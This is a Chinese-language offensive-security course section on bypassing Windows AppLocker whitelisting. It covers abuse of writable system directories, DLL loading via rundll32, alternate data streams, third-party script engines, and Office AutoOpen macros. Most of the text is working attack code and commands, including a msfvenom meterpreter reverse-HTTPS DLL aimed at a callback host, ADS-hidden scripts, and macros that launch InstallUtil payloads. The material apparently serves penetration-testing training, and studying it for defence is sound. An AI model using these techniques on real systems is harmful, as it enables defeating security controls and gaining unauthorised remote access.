# Module 09: 应用白名单绕过

## 第二节：基础绕过技术

### 绕过思路

AppLocker 的默认规则存在多个弱点，我们可以利用这些弱点绑定白名单限制。

---

## 一、可写目录绕过

### 1.1 原理

默认规则允许 `C:\Windows\*` 下的所有程序执行，但某些子目录对普通用户是**可写的**。

```
默认规则假设:
C:\Windows\ 目录 → 只有管理员可写

实际情况:
C:\Windows\Tasks\ → 普通用户可写！
C:\Windows\Temp\ → 普通用户可写！
```

### 1.2 查找可写目录

```cmd
:: 使用 AccessChk 查找可写目录
accesschk.exe -w -s -q -u Users "C:\Windows" 2>nul

:: 常见可写目录
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\SysWOW64\Tasks
C:\Windows\SysWOW64\com\dmp
```

### 1.3 利用方法

```cmd
:: 1. 复制 payload 到可写目录
copy payload.exe C:\Windows\Tasks\

:: 2. 执行
C:\Windows\Tasks\payload.exe
```

### 1.4 C# 示例

```csharp
using System;
using System.IO;

class Program
{
    static void Main()
    {
        // 可写目录列表
        string[] writableDirs = {
            @"C:\Windows\Tasks",
            @"C:\Windows\Temp",
            @"C:\Windows\tracing"
        };

        foreach (string dir in writableDirs)
        {
            if (Directory.Exists(dir))
            {
                try
                {
                    string testFile = Path.Combine(dir, "test.txt");
                    File.WriteAllText(testFile, "test");
                    File.Delete(testFile);
                    Console.WriteLine($"[+] Writable: {dir}");
                }
                catch
                {
                    Console.WriteLine($"[-] Not writable: {dir}");
                }
            }
        }
    }
}
```

## 二、DLL 规则绕过

### 2.1 原理

默认情况下，AppLocker **不启用 DLL 规则**，这意味着可以加载任意 DLL。

### 2.2 创建恶意 DLL

```bash
# 使用 msfvenom 生成 DLL
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f dll \
    -o payload.dll
```

### 2.3 使用 rundll32 执行

```cmd
:: 执行 DLL 中的导出函数
rundll32.exe payload.dll,DllMain

:: 或者使用 Control_RunDLL
rundll32.exe payload.dll,Control_RunDLL
```

### 2.4 C++ DLL 示例

```cpp
// payload.cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // 恶意代码在这里执行
        WinExec("cmd.exe", SW_SHOW);
        break;
    }
    return TRUE;
}

// 导出函数
extern "C" __declspec(dllexport) void Run()
{
    WinExec("cmd.exe", SW_SHOW);
}
```

## 三、备用数据流 (ADS) 绕过

### 3.1 什么是备用数据流？

NTFS 文件系统支持**备用数据流 (Alternate Data Streams)**，可以在文件中隐藏数据。

```
普通文件:
file.txt → 主数据流

带 ADS 的文件:
file.txt → 主数据流
file.txt:hidden → 备用数据流 (隐藏)
```

### 3.2 利用 ADS 绕过

```cmd
:: 1. 创建恶意脚本
echo var shell = new ActiveXObject("WScript.Shell"); > test.js
echo shell.Run("cmd.exe"); >> test.js

:: 2. 将脚本写入白名单文件的 ADS
type test.js > "C:\Program Files\SomeApp\log.txt:payload.js"

:: 3. 查看 ADS
dir /r "C:\Program Files\SomeApp\log.txt"

:: 4. 执行 ADS 中的脚本
wscript "C:\Program Files\SomeApp\log.txt:payload.js"
```

### 3.3 查找可利用的文件

```powershell
# 查找白名单目录中用户可写的文件
Get-ChildItem "C:\Program Files" -Recurse -File |
    Where-Object { $_.FullName -notmatch "Windows Defender" } |
    ForEach-Object {
        try {
            [System.IO.File]::OpenWrite($_.FullName).Close()
            Write-Host "[+] Writable: $($_.FullName)"
        } catch {}
    }
```

### 3.4 ADS 适用前提与失败判断

| 判断点 | 说明 |
|---|---|
| 文件系统必须是 NTFS | 非 NTFS 不支持 ADS |
| 需要可写宿主文件或目录 | 不能只看目录在白名单里，还要能写入数据流 |
| 执行器必须能读取 ADS 路径 | 不同脚本宿主、工具和策略对 `file:stream` 支持不同 |
| 规则不能显式检查 ADS | 新策略或 EDR 可能记录/阻止 ADS 执行 |
| 和 DLL 规则不同 | ADS 是把内容藏在数据流里，DLL 绕过依赖加载规则或搜索路径 |

失败时优先确认：`dir /r` 是否能看到数据流、执行器是否真的读取了 ADS、AppLocker 日志里是路径规则拦截还是脚本内容被 AMSI/AV 拦截。

## 四、第三方脚本引擎绕过

### 4.1 原理

AppLocker 只限制 Windows 原生脚本，**不限制第三方脚本引擎**。

### 4.2 Python 绕过

```python
# payload.py
import subprocess
subprocess.Popen("cmd.exe")
```

```cmd
:: 执行
python payload.py
```

### 4.3 Java 绕过

```java
// Payload.java
import java.io.*;

public class Payload {
    public static void main(String[] args) throws Exception {
        Runtime.getRuntime().exec("cmd.exe");
    }
}
```

```cmd
:: 编译和执行
javac Payload.java
java Payload
```

### 4.4 Perl 绕过

```perl
# payload.pl
system("cmd.exe");
```

```cmd
:: 执行
perl payload.pl
```

## 五、Office 宏绕过

### 5.1 原理

AppLocker **不限制 VBA 宏代码**，即使文档保存在非白名单位置。

### 5.2 利用方法

```vba
Sub AutoOpen()
    ' VBA 代码不受 AppLocker 限制
    CreateObject("WScript.Shell").Run "cmd.exe"
End Sub
```

### 5.3 结合其他技术

```vba
Sub AutoOpen()
    Dim cmd As String
    ' 使用 InstallUtil 绕过
    cmd = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\payload.exe"
    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```
